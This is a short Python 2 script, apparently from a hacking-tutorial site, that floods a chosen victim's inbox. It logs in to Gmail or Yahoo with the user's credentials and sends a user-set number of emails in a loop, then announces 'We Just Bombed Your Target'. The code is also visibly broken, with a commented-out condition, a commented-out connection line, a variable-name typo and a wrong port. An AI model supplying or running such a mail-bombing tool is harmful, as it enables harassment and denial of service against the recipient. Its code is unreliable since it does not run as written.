#!/usr/bin/python
#E-Bv0.1
#This code for education purpose only.
#Use it at your own risk !!!



import os
import smtplib
import getpass
import sys

print '\n******************************************************'
print '\n*      THIS IS ONLY FOR EDUCATIONAL PURPOSE          *'
print '\n*             AUTHOR: SWETABH SUMAN                  *'
print '\n*         WEBSITE: WWW.HACKERNUCLEUS.COM             *'
print '\n*                DATE: 20 MAY 2017                   *'
print '\n******************************************************'
print '\n'
server = raw_input ('MailServer Gmail: ')
user = raw_input('Please Enter Your E-mail ID: ')
passwd = getpass.getpass('Please Enter Your Password: ')


to = raw_input('\nEnter Sender E-mail ID: ')
#subject = raw_input('Subject: ') 
body = raw_input('Enter Your Message: ')
total = input('Number Of Items : ')

if #server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 995
else:
    print 'We Are Product of Hacker Nucleus.'
    sys.exit()

print '\nPlease Visit www.HackerNucleus.com'

try:
    #server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp-server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print '\nwww.hackernucleus.com (Please Visit For More Educational Stuff)'
        print "\rSending Emails... : %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Yay! We Just Bombed Your Target !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
